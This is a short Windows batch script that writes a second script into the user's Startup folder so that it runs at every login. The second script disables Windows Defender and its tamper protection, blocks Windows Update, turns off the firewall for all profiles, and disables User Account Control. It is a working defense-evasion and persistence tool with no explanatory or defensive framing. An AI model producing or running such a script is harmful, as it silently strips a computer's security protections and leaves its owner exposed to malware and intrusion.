@echo off

REM Disable security and inserts it into %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

REM Create batch file in the Startup folder
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

REM Add command to the batch file to disable anti-tampering
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v AntiTamperProtected /t REG_DWORD /d 0 /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

REM Add command to the batch file to disable Windows Update
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

REM Add command to the batch file to disable Firewall
echo netsh advfirewall set allprofiles state off >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

REM Add command to the batch file to disable User Account Control
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\security_disable.bat"

echo Done!

pause
